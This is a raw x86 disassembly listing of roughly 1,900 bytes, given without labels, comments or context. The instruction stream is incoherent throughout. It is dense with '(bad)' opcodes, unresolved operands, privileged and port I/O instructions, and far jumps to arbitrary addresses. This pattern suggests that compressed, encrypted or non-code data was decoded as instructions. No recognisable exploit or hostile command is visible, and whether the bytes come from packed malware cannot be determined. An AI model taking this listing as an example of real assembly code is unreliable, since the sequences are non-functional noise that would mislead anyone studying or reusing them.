  41df48:	retf   0x1188
  41df4b:	dec    ecx
  41df4c:	add    BYTE PTR [edx],ch
  41df4e:	popf   
  41df4f:	xor    al,0x13
  41df51:	(bad)  
  41df52:	repz dec ebp
  41df54:	jmp    0xa45:0xb10d56e7
  41df5b:	sbb    al,BYTE PTR [ecx+ecx*8]
  41df5e:	aad    0x13
  41df60:	sbb    eax,0x8129109c
  41df65:	jle    0x41dfc9
  41df67:	scas   eax,DWORD PTR es:[edi]
  41df68:	xchg   ebx,eax
  41df6a:	repz mov dl,0x90
  41df6d:	outs   dx,BYTE PTR ds:[esi]
  41df6e:	scas   al,BYTE PTR es:[edi]
  41df6f:	mov    eax,0x234badd0
  41df74:	leave  
  41df75:	icebp  
  41df76:	xlat   BYTE PTR ds:[ebx]
  41df77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df78:	sub    eax,0xd497c0d3
  41df7d:	call   0x902c714
  41df82:	int    0xcd
  41df84:	inc    ebp
  41df85:	adc    eax,DWORD PTR [ebp+0x41]
  41df88:	mov    ds:0x1d379dfb,eax
  41df8d:	inc    esi
  41df8e:	loope  0x41dfb1
  41df90:	lahf   
  41df91:	in     eax,dx
  41df92:	retf   
  41df93:	or     ah,BYTE PTR [ebx+0x3e9f599e]
  41df99:	mov    edx,0xadd02b69
  41df9e:	xor    BYTE PTR [edx],ah
  41dfa0:	aam    0xbe
  41dfa2:	pop    ebx
  41dfa3:	(bad)
  41dfa6:	mov    bl,0xf6
  41dfa8:	pop    ebp
  41dfa9:	sub    eax,0x22fc2e07
  41dfae:	bound  esi,QWORD PTR [ebx+0x38]
  41dfb1:	jae    0x41df60
  41dfb3:	mov    ebx,0x4826de7a
  41dfb8:	div    DWORD PTR [esi]
  41dfba:	jg     0x41df83
  41dfbc:	pop    esp
  41dfbd:	inc    esp
  41dfbe:	sar    BYTE PTR [edi-0x9953616],0x79
  41dfc5:	mov    ebp,0xa6fe349f
  41dfca:	loop   0x41df80
  41dfcc:	(bad)  
  41dfcd:	data16 and bl,BYTE PTR [eax+0x6aff77cb]
  41dfd4:	sbb    ch,BYTE PTR gs:[eax+0x1807f32b]
  41dfdb:	sbb    ebp,DWORD PTR [ebp+ebx*4+0x61]
  41dfdf:	jg     0x41dfff
  41dfe1:	pop    esp
  41dfe2:	xchg   edi,eax
  41dfe3:	leave  
  41dfe4:	pop    ebp
  41dfe5:	mov    edx,0xf5245d5b
  41dfea:	scas   eax,DWORD PTR es:[edi]
  41dfeb:	push   es
  41dfec:	or     dl,BYTE PTR [ecx]
  41dfee:	sub    al,0x2a
  41dff0:	dec    ecx
  41dff1:	pop    ds
  41dff2:	xor    dl,BYTE PTR [edx+eiz*2-0x11]
  41dff6:	addr16 jno 0x41dfe3
  41dff9:	or     al,0xb2
  41dffb:	xor    cl,ch
  41dffd:	call   0x22a8:0xc6ed1532
  41e004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e005:	adc    edi,DWORD PTR [ebx-0x63969ca1]
  41e00b:	dec    edx
  41e00c:	jb     0x41dfbe
  41e00e:	push   edi
  41e00f:	jg     0x41e080
  41e011:	cmp    al,0x43
  41e013:	imul   eax,DWORD PTR gs:[esi+0x51],0x1c
  41e018:	or     dh,cl
  41e01a:	popf   
  41e01b:	(bad)  
  41e01c:	icebp  
  41e01d:	push   0xefe54956
  41e022:	jns    0x41e093
  41e024:	push   0x44da234
  41e029:	sbb    bh,BYTE PTR [eax]
  41e02b:	adc    cl,BYTE PTR [edi+esi*8-0x6b]
  41e02f:	addr16 jle 0x41e02a
  41e032:	sahf   
  41e033:	sbb    eax,0x13b50005
  41e038:	jno    0x41e017
  41e03a:	mov    ch,0xb6
  41e03c:	rcl    ebx,1
  41e03e:	sti    
  41e03f:	adc    al,0x4c
  41e041:	repnz adc DWORD PTR [edi+eiz*1],esp
  41e045:	lds    esp,FWORD PTR [ecx-0x66]
  41e048:	in     eax,dx
  41e049:	iret   
  41e04a:	mov    edx,0xc8869f37
  41e04f:	arpl   WORD PTR [edx+0x2a],bp
  41e052:	jge    0x41dfef
  41e054:	add    al,0xbc
  41e056:	and    BYTE PTR [edi],ch
  41e058:	push   edi
  41e059:	fnstsw WORD PTR [edi-0x38]
  41e05c:	mov    ebx,0x2685052b
  41e061:	fistp  WORD PTR [ebx-0x99dc360]
  41e067:	sub    al,BYTE PTR [esi+edi*4+0x35b0ae8c]
  41e06e:	pop    edx
  41e06f:	cdq    
  41e070:	out    0xfd,eax
  41e072:	mov    cl,0x6c
  41e074:	jb     0x41e041
  41e076:	inc    ecx
  41e077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e078:	jae    0x41e0b3
  41e07a:	inc    eax
  41e07b:	mov    ebx,0x789d8ad5
  41e080:	mov    bh,0x19
  41e082:	jnp    0x41e06b
  41e084:	cld    
  41e085:	dec    esp
  41e086:	add    edi,DWORD PTR [edx]
  41e088:	test   BYTE PTR [edi+esi*4-0x7b484834],0xbe
  41e090:	and    esp,ebp
  41e092:	xchg   edx,eax
  41e093:	neg    DWORD PTR [ecx]
  41e095:	cld    
  41e096:	inc    ebp
  41e097:	fcomp  QWORD PTR [eax]
  41e099:	aas    
  41e09a:	add    eax,0xc8e3afba
  41e09f:	push   ebx
  41e0a0:	lds    ecx,FWORD PTR [edx]
  41e0a2:	mov    eax,0xc78e1095
  41e0a7:	and    al,0x2a
  41e0a9:	nop
  41e0aa:	and    edx,DWORD PTR [eax+0x56]
  41e0ad:	hlt    
  41e0ae:	enter  0x2443,0xc
  41e0b2:	retf   
  41e0b3:	stos   DWORD PTR es:[edi],eax
  41e0b4:	sbb    DWORD PTR [ebx-0x2a],ebx
  41e0b7:	fsubrp st(0),st
  41e0b9:	xchg   ebp,eax
  41e0ba:	sbb    eax,0x972becfb
  41e0bf:	push   ss
  41e0c0:	les    eax,FWORD PTR [ebx+0x7ae12445]
  41e0c6:	sbb    eax,DWORD PTR [esi-0xd85bd26]
  41e0cc:	in     eax,0xb4
  41e0ce:	dec    eax
  41e0cf:	xchg   ecx,eax
  41e0d0:	jb     0x41e072
  41e0d2:	call   0x5f5e:0x8081c682
  41e0d9:	jne    0x41e0ec
  41e0db:	inc    esi
  41e0dc:	sub    eax,0x41288167
  41e0e1:	adc    eax,0x88ed5421
  41e0e6:	call   DWORD PTR [ebx+0x4cdb5c23]
  41e0ec:	dec    ebx
  41e0ed:	xchg   edi,eax
  41e0ee:	xor    DWORD PTR [eax],esp
  41e0f0:	shr    eax,0xee
  41e0f3:	or     ah,ah
  41e0f5:	mov    esi,0x24af2ff2
  41e0fa:	popf   
  41e0fb:	pop    ebp
  41e0fc:	repnz sub ecx,DWORD PTR [edi+0x56c11022]
  41e103:	outs   dx,BYTE PTR ds:[esi]
  41e104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e105:	mov    esp,0x93c25fc3
  41e10a:	in     al,dx
  41e10b:	pop    ebx
  41e10c:	inc    esp
  41e10d:	push   edx
  41e10e:	gs inc edi
  41e110:	push   esi
  41e111:	cwde   
  41e112:	cdq    
  41e113:	clc    
  41e114:	(bad)  [esi-0x2d]
  41e117:	ds test ebx,esi
  41e11a:	bound  ebx,QWORD PTR ds:0xaf1d3f85
  41e120:	mov    ds:0xce358853,al
  41e125:	sahf   
  41e126:	xor    DWORD PTR [edi+eiz*1+0x1a],edi
  41e12a:	lods   eax,DWORD PTR ds:[esi]
  41e12b:	shl    DWORD PTR [ebx+ebp*1],1
  41e12e:	cmp    al,0xce
  41e130:	arpl   WORD PTR [edx-0x6b],ax
  41e133:	inc    edx
  41e134:	pop    ebx
  41e135:	shl    bl,1
  41e137:	mov    ch,bh
  41e139:	out    dx,eax
  41e13a:	test   eax,0xa5966aa7
  41e13f:	and    bh,BYTE PTR [edi+0x27]
  41e142:	mov    edi,0x653535f4
  41e147:	mov    cl,0xd3
  41e149:	mov    eax,edi
  41e14b:	xor    al,0x96
  41e14d:	lock sti 
  41e14f:	inc    ebp
  41e150:	dec    ebp
  41e151:	loopne 0x41e1c7
  41e153:	jmp    FWORD PTR [eax+0x77]
  41e156:	cmp    al,0xd3
  41e158:	sbb    bl,BYTE PTR ds:0x8f9abee3
  41e15e:	lods   al,BYTE PTR ds:[esi]
  41e15f:	cmp    esp,DWORD PTR [esi]
  41e161:	mov    ds:0x6a650f53,eax
  41e166:	and    BYTE PTR [ebx+0x3d09c6eb],dl
  41e16c:	mov    al,0xd3
  41e16e:	jb     0x41e0fe
  41e170:	fwait
  41e171:	cmp    eax,0x9aa8ead8
  41e176:	mov    al,0x17
  41e178:	fst    QWORD PTR [edi-0x1140189b]
  41e17e:	shl    BYTE PTR gs:[esp+edx*2-0x74],0x3d
  41e184:	pop    es
  41e185:	xchg   DWORD PTR [eax+edx*4],ebp
  41e188:	and    ah,BYTE PTR [edx]
  41e18a:	aas    
  41e18b:	xchg   edx,eax
  41e18c:	mov    ebx,0x8fcbff1a
  41e191:	neg    BYTE PTR gs:[ecx-0x39]
  41e195:	inc    BYTE PTR [edx-0x3a]
  41e198:	cmp    DWORD PTR [edx-0x68],esi
  41e19b:	cmp    eax,0x49d8940a
  41e1a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1a1:	mov    DWORD PTR [eax-0x4a346f79],eax
  41e1a7:	in     al,dx
  41e1a8:	fistp  QWORD PTR [ecx]
  41e1aa:	sbb    DWORD PTR [ebx-0x3d],ebx
  41e1ad:	cdq    
  41e1ae:	pop    ds
  41e1af:	dec    edi
  41e1b0:	add    edx,DWORD PTR [esi]
  41e1b2:	jne    0x41e1da
  41e1b4:	mov    esi,0xc0e8294f
  41e1b9:	xchg   ebx,eax
  41e1ba:	mov    al,ds:0xe33817e4
  41e1bf:	push   0xf77b0be7
  41e1c4:	not    DWORD PTR [ebp-0x69071900]
  41e1ca:	add    BYTE PTR [esp+esi*8-0x23],ah
  41e1ce:	aaa    
  41e1cf:	push   ebx
  41e1d0:	ss lahf 
  41e1d2:	in     al,0x81
  41e1d4:	addr16 cld 
  41e1d6:	popf   
  41e1d7:	or     al,0x6b
  41e1d9:	scas   eax,DWORD PTR es:[edi]
  41e1da:	xchg   ebp,eax
  41e1db:	mov    ?,edi
  41e1dd:	aaa    
  41e1de:	jb     0x41e217
  41e1e0:	jge    0x41e1f8
  41e1e2:	pop    ss
  41e1e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1e4:	in     eax,dx
  41e1e5:	mov    ecx,0x89d10748
  41e1ea:	pop    ebx
  41e1eb:	xchg   edx,eax
  41e1ec:	(bad)  
  41e1ee:	mov    eax,ds:0x531a2def
  41e1f3:	inc    ebx
  41e1f4:	bound  edx,QWORD PTR [esi]
  41e1f6:	push   esi
  41e1f7:	or     eax,0xb0b208fe
  41e1fc:	sub    BYTE PTR [ebp-0xadb0a35],dl
  41e202:	dec    esp
  41e203:	mov    ds:0xebc43cf7,eax
  41e208:	dec    esi
  41e209:	cmp    DWORD PTR [edi],0xffffffca
  41e20c:	jmp    0x6716:0x7d08d318
  41e213:	xor    eax,0x3548781e
  41e218:	in     al,dx
  41e219:	enter  0xc903,0xf5
  41e21d:	and    DWORD PTR [esi+ecx*2],esi
  41e220:	inc    ebp
  41e221:	mov    ah,0x85
  41e223:	xchg   esi,eax
  41e224:	mov    cl,0xf7
  41e226:	add    BYTE PTR [ecx+eax*2+0x70],0xd2
  41e22b:	adc    eax,0x848b03c0
  41e230:	push   ebp
  41e231:	sub    edi,esp
  41e233:	repnz xchg edx,eax
  41e236:	int3   
  41e237:	mov    ss,WORD PTR [ebx]
  41e239:	pop    esi
  41e23a:	xlat   BYTE PTR ds:[ebx]
  41e23b:	adc    eax,0xf2aaa5c3
  41e240:	inc    ecx
  41e241:	mov    al,ds:0x6392bec6
  41e246:	or     DWORD PTR [eax-0x62],esi
  41e249:	jmp    DWORD PTR [ebp+0x4214c12d]
  41e24f:	xor    ebx,eax
  41e251:	imul   ebp,DWORD PTR [ebx-0x4cdbebc9],0x3c
  41e258:	or     bh,cl
  41e25a:	lods   al,BYTE PTR ds:[esi]
  41e25b:	aaa    
  41e25c:	aas    
  41e25d:	ins    BYTE PTR es:[edi],dx
  41e25e:	es cmp eax,0xb487ff40
  41e264:	push   ecx
  41e265:	ret    
  41e266:	lods   eax,DWORD PTR ds:[esi]
  41e267:	mov    al,BYTE PTR [eax+ebp*1+0x691c7505]
  41e26e:	add    al,0x5
  41e270:	adc    BYTE PTR [edi+0x276e33e5],dh
  41e276:	mov    eax,ds:0x3c5704de
  41e27b:	ror    esp,1
  41e27d:	and    eax,0xd71130d
  41e282:	xchg   ebp,eax
  41e283:	pop    edi
  41e284:	shr    DWORD PTR [ecx+0x70aa9c94],0xd8
  41e28b:	jecxz  0x41e2bd
  41e28d:	sbb    bh,bl
  41e28f:	adc    esp,DWORD PTR [ecx+eax*2-0x7]
  41e293:	cmp    DWORD PTR [esi],ebx
  41e295:	sub    cl,ch
  41e297:	push   es
  41e298:	mov    ds:0x9f59b0f6,eax
  41e29d:	mov    edx,0xc56191bc
  41e2a2:	es mov ebp,0x84f35541
  41e2a8:	cmp    eax,0xab268872
  41e2ad:	sbb    al,BYTE PTR [edi+0x61ed52a5]
  41e2b3:	sbb    DWORD PTR [edi+eiz*4],edi
  41e2b6:	inc    ebp
  41e2b7:	mov    ?,WORD PTR [edi-0x8986794]
  41e2bd:	jge    0x41e268
  41e2bf:	stc    
  41e2c0:	xor    al,0x75
  41e2c2:	mov    cl,0x8e
  41e2c4:	shr    DWORD PTR [edi],1
  41e2c6:	xchg   edi,eax
  41e2c7:	leave  
  41e2c8:	sbb    esi,ecx
  41e2ca:	(bad)  
  41e2cb:	idiv   BYTE PTR [esi]
  41e2cd:	(bad)  
  41e2ce:	mov    eax,ds:0x7c94d501
  41e2d3:	popa   
  41e2d4:	arpl   WORD PTR [ebp+0x20ac490c],bx
  41e2da:	mov    bh,0x18
  41e2dc:	lods   al,BYTE PTR ds:[esi]
  41e2dd:	dec    ebp
  41e2de:	(bad)  
  41e2df:	fldenv [ebp-0x299861f7]
  41e2e5:	int    0x6c
  41e2e7:	push   eax
  41e2e8:	mov    esp,0xa23c1525
  41e2ed:	pushf  
  41e2ee:	jle    0x41e349
  41e2f0:	inc    edi
  41e2f1:	in     eax,dx
  41e2f2:	xor    dh,dl
  41e2f4:	push   cs
  41e2f5:	sbb    eax,0x94562c5e
  41e2fa:	inc    esp
  41e2fb:	std    
  41e2fc:	adc    eax,0x8307e5ee
  41e301:	xlat   BYTE PTR ds:[ebx]
  41e302:	add    BYTE PTR [edx+0x47eb9d],dh
  41e308:	sar    BYTE PTR [edx+eiz*2-0x5669964a],0x8c
  41e310:	jmp    FWORD PTR [eax-0x4e]
  41e313:	or     ebx,DWORD PTR [ebp+0x3668837d]
  41e319:	imul   DWORD PTR [edx]
  41e31b:	pop    es
  41e31c:	push   edx
  41e31d:	push   0xaeed0d16
  41e322:	jno    0x41e3a3
  41e324:	fs sti 
  41e326:	mov    bl,0xd0
  41e328:	adc    dh,BYTE PTR [eax-0x122482e1]
  41e32e:	pop    eax
  41e32f:	data16 jnp 0x41e396
  41e332:	push   esi
  41e333:	cmp    esp,ebp
  41e335:	pop    ebp
  41e336:	popf   
  41e337:	(bad)
  41e33b:	lods   eax,DWORD PTR ds:[esi]
  41e33c:	call   0x915c:0xdb3d3a02
  41e343:	cmp    esp,DWORD PTR [ebx-0x18d10fd0]
  41e349:	and    dl,ch
  41e34b:	das    
  41e34c:	loope  0x41e307
  41e34e:	dec    edx
  41e34f:	mov    dh,0xff
  41e351:	xchg   BYTE PTR [esi-0x66f94077],dh
  41e357:	sub    ecx,esp
  41e359:	(bad)  
  41e35a:	cli    
  41e35b:	and    esp,DWORD PTR [eax+esi*4-0x7b]
  41e35f:	dec    ebp
  41e360:	pop    ds
  41e361:	jno    0x41e33b
  41e363:	cmp    ebp,DWORD PTR [edx-0x268c8370]
  41e369:	in     eax,0xf4
  41e36b:	idiv   BYTE PTR cs:[esi]
  41e36e:	pop    ebx
  41e36f:	dec    edx
  41e370:	int    0xe8
  41e372:	jo     0x41e3d7
  41e374:	ja     0x41e3d7
  41e376:	sbb    bl,BYTE PTR [ebx+ebx*4+0x60]
  41e37a:	fwait
  41e37b:	ins    DWORD PTR es:[edi],dx
  41e37c:	cmp    al,0xd4
  41e37e:	cli    
  41e37f:	leave  
  41e380:	xchg   esp,eax
  41e381:	clc    
  41e382:	rol    DWORD PTR [esp-0x76],cl
  41e386:	pop    edx
  41e387:	je     0x41e3ac
  41e389:	sbb    esi,edi
  41e38b:	push   ebp
  41e38c:	xlat   BYTE PTR ds:[ebx]
  41e38d:	out    dx,al
  41e38e:	rdtsc  
  41e390:	lods   eax,DWORD PTR ds:[esi]
  41e391:	jnp    0x41e343
  41e393:	pop    edi
  41e394:	dec    edx
  41e395:	fdiv   DWORD PTR [esi+eiz*1-0x6d84e56f]
  41e39c:	loope  0x41e414
  41e39e:	lock sbb al,0x79
  41e3a1:	sub    eax,0x1269b05a
  41e3a6:	mov    dl,0x77
  41e3a8:	mov    ah,0xe0
  41e3aa:	adc    bl,BYTE PTR [edx+0x61b6fa1]
  41e3b0:	dec    edx
  41e3b1:	pop    ebp
  41e3b2:	mov    dl,0x91
  41e3b4:	ja     0x41e413
  41e3b6:	(bad)  
  41e3b7:	xchg   edi,eax
  41e3b8:	ds or  eax,0x3ae67520
  41e3be:	push   esi
  41e3bf:	jecxz  0x41e411
  41e3c1:	das    
  41e3c2:	mov    DWORD PTR [edx-0x7f2c2d13],0x93d8e8a6
  41e3cc:	push   ds
  41e3cd:	fwait
  41e3ce:	js     0x41e3f5
  41e3d0:	adc    al,0xa2
  41e3d2:	test   DWORD PTR [edi+eiz*4-0x53],edi
  41e3d6:	pop    edx
  41e3d7:	bound  edi,QWORD PTR [edx-0x69062a5b]
  41e3dd:	add    esi,ebx
  41e3df:	test   al,0xf8
  41e3e2:	pushf  
  41e3e3:	in     eax,dx
  41e3e4:	jp     0x41e40f
  41e3e6:	mov    al,0x15
  41e3e8:	std    
  41e3e9:	rcl    BYTE PTR [ebp-0x7cc40078],1
  41e3ef:	xor    al,0xc0
  41e3f1:	imul   esp,DWORD PTR [esi-0x45e2f639],0x1a
  41e3f8:	nop
  41e3f9:	mov    ch,0xe6
  41e3fb:	sub    eax,0xf92d6ca6
  41e400:	adc    eax,DWORD PTR [esp+edi*2]
  41e403:	push   cs
  41e404:	xor    DWORD PTR [esi-0x33f5da9b],edi
  41e40a:	mov    dl,0xa6
  41e40c:	fwait
  41e40d:	das    
  41e40e:	pop    esi
  41e40f:	pop    ebp
  41e410:	xchg   esi,eax
  41e411:	lods   al,BYTE PTR ds:[esi]
  41e412:	out    dx,al
  41e413:	test   BYTE PTR [esi+eiz*8+0x48],bl
  41e417:	psubd  mm0,QWORD PTR [esp+eiz*8+0xc3c8a4b]
  41e41f:	xchg   edx,eax
  41e420:	arpl   WORD PTR [eax-0x23],ax
  41e423:	out    0x4c,al
  41e425:	pushf  
  41e426:	jp     0x41e469
  41e428:	mov    edx,0x88e5fdc
  41e42d:	pop    esp
  41e42e:	add    bh,bh
  41e430:	aad    0x64
  41e432:	aas    
  41e433:	(bad)  
  41e434:	mov    al,ds:0xd5b034a8
  41e439:	lea    edx,[esi-0x8f23b3b]
  41e43f:	mov    al,ds:0xbc042c6c
  41e444:	mov    cl,0x42
  41e446:	cmp    bh,BYTE PTR [ebp-0x510632ee]
  41e44c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e44d:	sub    eax,DWORD PTR [ebp+edx*2-0x6063ab17]
  41e454:	dec    edx
  41e455:	jbe    0x41e4a4
  41e457:	jo     0x41e431
  41e459:	push   cs
  41e45a:	out    dx,eax
  41e45b:	push   edi
  41e45c:	inc    edi
  41e45d:	sbb    BYTE PTR [ecx-0x3f],bl
  41e460:	lea    esi,[edx+0x1a11c860]
  41e466:	inc    ebx
  41e467:	lahf   
  41e468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e469:	retf   0xbc14
  41e46c:	dec    ecx
  41e46d:	inc    edx
  41e46e:	bound  edx,QWORD PTR [edx]
  41e470:	mov    WORD PTR [ebp+0x47d72ceb],cs
  41e476:	jmp    0x54f14a8e
  41e47b:	jl     0x41e45e
  41e47d:	outs   dx,BYTE PTR ds:[esi]
  41e47e:	leave  
  41e47f:	stos   BYTE PTR es:[edi],al
  41e480:	clc    
  41e481:	call   0xb40f0eb3
  41e486:	shr    BYTE PTR [ebp+0x707d81f3],cl
  41e48c:	xor    BYTE PTR [edx-0x148c5b2d],dl
  41e492:	ins    DWORD PTR es:[edi],dx
  41e493:	mov    ecx,0xa028285c
  41e498:	mov    ebx,0x8dc6a5b3
  41e49d:	or     edi,ecx
  41e49f:	sub    esi,ebx
  41e4a1:	pop    eax
  41e4a2:	jae    0x41e454
  41e4a4:	in     al,dx
  41e4a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4a6:	and    al,0xda
  41e4a8:	imul   ecx,DWORD PTR [eax+0x14],0x35
  41e4ac:	(bad)  
  41e4ad:	fbstp  TBYTE PTR [esi]
  41e4af:	test   eax,0x55e0644f
  41e4b4:	xchg   edi,eax
  41e4b5:	lods   al,BYTE PTR ds:[esi]
  41e4b6:	mov    DWORD PTR gs:[edx+0x30b4bdf7],edx
  41e4bd:	ror    DWORD PTR [eax],1
  41e4bf:	loopne 0x41e470
  41e4c1:	or     DWORD PTR [ebx],ebx
  41e4c3:	pop    edx
  41e4c4:	in     eax,0xa1
  41e4c6:	cmp    ecx,esi
  41e4c8:	in     eax,dx
  41e4c9:	mov    BYTE PTR [ebx+0x63],bl
  41e4cc:	jae    0x41e51c
  41e4ce:	aam    0x82
  41e4d0:	add    ebx,DWORD PTR [edi+0x1a]
  41e4d3:	push   es
  41e4d4:	outs   dx,DWORD PTR ds:[esi]
  41e4d5:	test   BYTE PTR [edx],dl
  41e4d7:	xor    al,0xab
  41e4d9:	mov    edi,0x2ed0bbc
  41e4de:	imul   edi,DWORD PTR [ecx+edi*4],0x39
  41e4e2:	push   ebx
  41e4e3:	lods   eax,DWORD PTR ds:[esi]
  41e4e4:	aas    
  41e4e5:	aam    0x12
  41e4e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4e8:	pushf  
  41e4e9:	fild   DWORD PTR [esi*8+0x77572c0f]
  41e4f0:	mov    edi,0x14479b98
  41e4f5:	je     0x41e4f7
  41e4f7:	push   ss
  41e4f8:	cmp    al,0xa3
  41e4fa:	push   ds
  41e4fb:	pop    ds
  41e4fc:	xor    DWORD PTR [edi-0x4571d940],esp
  41e502:	mov    eax,0x454f5a8e
  41e507:	mov    esi,0x4d1aefe8
  41e50c:	mov    BYTE PTR [edx-0x27c885fc],ch
  41e512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e513:	xchg   edx,eax
  41e514:	inc    esi
  41e515:	mov    esp,0x809cb384
  41e51a:	sub    ebp,DWORD PTR [ebp-0x7b]
  41e51d:	icebp  
  41e51e:	rcl    DWORD PTR [eax+ebp*2-0x27],0xb3
  41e523:	adc    eax,0xaf240722
  41e528:	xor    esi,edi
  41e52a:	jg     0x41e541
  41e52c:	in     eax,dx
  41e52d:	arpl   bx,cx
  41e52f:	add    DWORD PTR [edi+0x68a8976d],esp
  41e535:	pop    edx
  41e536:	enter  0xf450,0x16
  41e53a:	mov    edx,0x64512eee
  41e53f:	inc    ebp
  41e540:	mov    bh,ch
  41e542:	aaa    
  41e543:	fs add eax,0xe9d4bea3
  41e549:	jb     0x41e4e9
  41e54b:	or     ch,BYTE PTR [edx]
  41e54d:	mov    BYTE PTR [edi],cl
  41e54f:	add    al,0xc4
  41e551:	dec    edi
  41e552:	mov    bh,BYTE PTR [ecx+0x4fe0100f]
  41e558:	mov    BYTE PTR [ecx+0x6d7b7c72],al
  41e55e:	rol    BYTE PTR [eax-0x4f],cl
  41e561:	mov    ah,0x7f
  41e563:	repnz mov ah,0x36
  41e566:	repnz add ch,al
  41e569:	(bad)  
  41e56a:	fcos   
  41e56c:	xor    DWORD PTR [edi+0x385873f7],esi
  41e572:	pop    eax
  41e573:	push   0xffffff89
  41e575:	mov    esi,0xa2080a93
  41e57a:	xor    eax,0x53e9ec5d
  41e57f:	jmp    0x2200ae36
  41e584:	ror    DWORD PTR [ebx-0x4e],0x33
  41e588:	clc    
  41e589:	mov    ds:0x3317ca1,al
  41e58e:	push   ebx
  41e58f:	sbb    DWORD PTR [esi],esp
  41e591:	or     BYTE PTR [ebx-0xe834325],dh
  41e597:	imul   edx,ebx,0xffffff83
  41e59a:	rcl    DWORD PTR [edx+0x58],1
  41e59d:	ret    
  41e59e:	aaa    
  41e59f:	xor    ecx,DWORD PTR [edx]
  41e5a1:	in     al,0x66
  41e5a3:	cli    
  41e5a4:	or     dl,BYTE PTR [ebx-0x36]
  41e5a7:	jnp    0x41e61f
  41e5a9:	clc    
  41e5aa:	jmp    0xfdd2c6d9
  41e5af:	stos   BYTE PTR es:[edi],al
  41e5b0:	mov    esp,0x269f112e
  41e5b5:	add    al,BYTE PTR [ebp+0x2117999e]
  41e5bb:	mov    ebp,0x64c72e5d
  41e5c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5c1:	rcl    DWORD PTR [edi+esi*1],0xaa
  41e5c5:	mov    esp,0xd920bf6b
  41e5ca:	lahf   
  41e5cb:	scas   al,BYTE PTR es:[edi]
  41e5cc:	ret    
  41e5cd:	fistp  QWORD PTR [ecx-0x6d]
  41e5d0:	std    
  41e5d1:	inc    ebx
  41e5d2:	or     BYTE PTR [edi],dh
  41e5d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5d5:	sbb    DWORD PTR [edx],esi
  41e5d7:	cmp    BYTE PTR [ebx],cl
  41e5d9:	jg     0x41e606
  41e5db:	out    0xfd,al
  41e5dd:	adc    al,0x96
  41e5df:	mov    bl,0x96
  41e5e1:	push   0xb586e309
  41e5e6:	sub    esi,DWORD PTR [ecx-0x56]
  41e5e9:	in     eax,0xaa
  41e5eb:	pop    esp
  41e5ec:	fwait
  41e5ed:	dec    edx
  41e5ee:	(bad)  
  41e5ef:	push   eax
  41e5f0:	or     ch,BYTE PTR [ebx]
  41e5f2:	add    DWORD PTR [ecx+0x5c],ebp
  41e5f5:	jne    0x41e5f5
  41e5f7:	xor    eax,edi
  41e5f9:	hlt    
  41e5fa:	(bad)  
  41e5fb:	cld    
  41e5fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5fd:	dec    ecx
  41e5fe:	push   ecx
  41e5ff:	pop    ebx
  41e600:	icebp  
  41e601:	ds jl  0x41e638
  41e604:	and    al,0x50
  41e606:	mov    ah,0xab
  41e608:	xchg   ebx,eax
  41e609:	mov    esp,0xf700c669
  41e60e:	call   0xa4e8fec9
  41e613:	gs out dx,al
  41e615:	xor    BYTE PTR [ebx+0x51f22845],0xe
  41e61c:	loop   0x41e666
  41e61e:	inc    ebx
  41e61f:	(bad)  
  41e620:	and    ebx,eax
  41e622:	mov    ds:0x1d04923b,al
  41e627:	and    DWORD PTR [esi-0x7ebe019d],edx
  41e62d:	adc    ecx,edx
  41e62f:	adc    eax,0x671c442c
  41e634:	add    ecx,DWORD PTR [ebx-0x7e29e180]
  41e63a:	inc    edi
  41e63b:	or     eax,0xa0ec0592
  41e640:	ret    
  41e641:	sub    edi,DWORD PTR ds:0xb51984e3
  41e647:	in     eax,0x29
  41e649:	mov    edi,0x142b2f65
  41e64e:	(bad)  
  41e650:	mov    edi,0x18c45ed6
  41e655:	adc    DWORD PTR [edx],ecx
  41e657:	gs jp  0x41e6a6
  41e65a:	sbb    ah,BYTE PTR [ecx]
  41e65c:	xlat   BYTE PTR ds:[ebx]
  41e65d:	shr    eax,0x3f
  41e660:	lods   eax,DWORD PTR ds:[esi]
  41e661:	in     eax,0x3b
  41e663:	jmp    0xdd128784
  41e668:	pop    eax
  41e669:	xchg   esp,eax
  41e66a:	lea    ecx,[ebp+0x748a0782]
  41e670:	mov    ?,WORD PTR [edi]
  41e672:	pop    ds
  41e673:	jg     0x41e61b
  41e675:	mov    ch,0xa9
  41e677:	in     al,dx
  41e678:	or     edx,DWORD PTR [edi+0x6e]
  41e67b:	mov    ds:0x3ba7bfa9,al
  41e680:	and    ebp,DWORD PTR [esp+eax*1]
  41e683:	xchg   ecx,eax
  41e684:	mov    edx,0x6f74c719
  41e689:	aaa    
  41e68a:	imul   esp,edi,0xffffffb5
  41e68d:	aad    0xae
  41e68f:	add    ebp,eax
  41e691:	dec    edx
  41e692:	cmp    al,0x63
  41e694:	xchg   BYTE PTR ds:0x11a28e59,dl
  41e69a:	push   0xffffff88
  41e69c:	out    0x6a,eax
  41e69e:	test   eax,0x9b4627f2
  41e6a3:	dec    esi
  41e6a4:	sub    edx,DWORD PTR [eax+0x4eca39df]
  41e6aa:	mov    bh,0x44
  41e6ac:	ret    
  41e6ad:	sub    DWORD PTR [ebp-0x1f],esi
  41e6b0:	add    BYTE PTR [ebx+ecx*1+0x1d290af3],ah
  41e6b7:	cmp    edi,edi
  41e6b9:	push   esp
  41e6ba:	mov    ebp,0xeee2974c
  41e6bf:	ins    DWORD PTR es:[edi],dx
  41e6c0:	aaa    
  41e6c1:	mov    al,0x49
  41e6c3:	jbe    0x41e685
  41e6c5:	cli    
  41e6c6:	pop    ecx
  41e6c7:	leave  
  41e6c8:	fcom   DWORD PTR [edx+0x25237957]
  41e6ce:	mov    cl,0x3f
  41e6d0:	push   ebp
  41e6d1:	mov    eax,0x793bffa0
  41e6d6:	cwde   
  41e6d7:	push   ecx
